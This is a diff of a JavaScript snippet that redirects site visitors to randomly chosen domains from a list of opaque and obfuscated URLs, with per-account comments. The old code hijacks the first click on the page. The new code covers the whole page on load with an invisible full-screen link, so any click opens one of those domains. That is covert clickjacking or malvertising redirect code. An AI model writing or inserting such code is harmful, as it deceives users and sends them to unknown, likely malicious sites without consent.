@@ -1,50 +1,32 @@
-function init() {
-  var arr = [
-    // hil: dabao
-    "https://grim-package.com/bO3WV.0sPU3rp/vSbumMVaJkZVD/0U1/N/DDMG2sOOTWcm2zL-TSUR0mMhzbYS5oNYz/cJ",
-    // "https://www.qrcreate.online",
+function createLink() {
+  var urls = [
+    // hil: db (ss)
+    "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
+    "https://www.qrcreate.online",
 
-    // hil: db123 
-    "https://classic-bonus.com/bY3.VK0OPK3tpYv/bYmQVDJ-Z/DI0/1/MKzqcYy/MQzzATy/LMTSUGz/NNzTIrzDMXDgMm",
+    // mon: db
+    "https://nutchaungong.com/4/7420689",
+    "https://maipheeg.com/4/7474716",
+    // "https://glocheexi.com/4/7237941",
+    // "https://coawoaph.net/4/7237942",
+    // "https://laichegloavy.com/4/7631332",
     
-    // // hil: Robert (robertgo)
-    // "https://few-politics.com/b.3eVz0dPY3_pMvGbBmZVDJGZ/DS0P1ENZDqcR3uO/DzkwwKLCTLU/0PNizgcT4aOTTUEN",
-    // // hil: Robert (anderson)
-    // "https://few-politics.com/bR3/V.0DPk3qpvvIbQm-VmJKZrDG0F1DNLDEc/3COCTZA/4RLxTDU/0QNFzCcQ5MMHDbkN",
-    
-    // // hil: BrianLee (leeisok)
-    // "https://aggravatingoil.com/b/3KVp0/P.3GpGvdb/mHVmJYZIDz0N1mN/Dacr3/MozgUj0RLFTjU/0CNSzOcOz/N/TNUk",
-    // // hil: BrianLee (brian)
-    // "https://aggravatingoil.com/b.3KVO0GPl3Mp/vxb/m/V/JqZWDl0y1/N_DLcd3-O/TIMxwYLUTCUc0KN/zTcj5EMgzJEk",
-
-    // mon: lucy
-    // "https://phuruxoods.com/4/7683326",
-    // "https://whauzavouweb.com/4/7683329",
-    // "https://naglelri.net/4/7683327",
-    // "https://fouwhigrezi.net/4/7683328",
-    "https://boovoogie.net/4/7683330",
-    "https://rangauck.com/4/7683319",
-
-    // "https://json.qrcreate.online",
-    // "https://dubzenom.com/4/7782127",
+    // "https://vorsoutseemt.com/4/7436813",
+    "https://eedootefaug.net/4/7420698",
+    // "https://futseerdoa.com/4/7237921",
+    "https://eeboazurg.net/4/7420696",
+    // "https://psauwaun.com/4/7614690",
+    // "https://ptougeegnep.net/4/7237907",
   ];
- 
-  var didOpen = false;
-  document.addEventListener("click", function() {
-    if (didOpen) {
-      return;
-    }
-    didOpen = true;
-    setTimeout(() => {
-      didOpen = false;
-    }, 3000);
 
-    var randomIndex = Math.floor(Math.random() * arr.length);
-    var randomLink = arr[randomIndex];
-    window.location.href = randomLink;
-  });
+  if (urls.length === 0) {
+    return;
+  }
+  var a = document.createElement('a');
+  a.href = urls[Math.floor(Math.random() * urls.length)];
+  a.rel = 'noopener noreferrer';
+  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
+  document.body.appendChild(a);
 }
 
-setTimeout(() => {
-  init();
-}, 500);
+document.addEventListener('DOMContentLoaded', createLink);
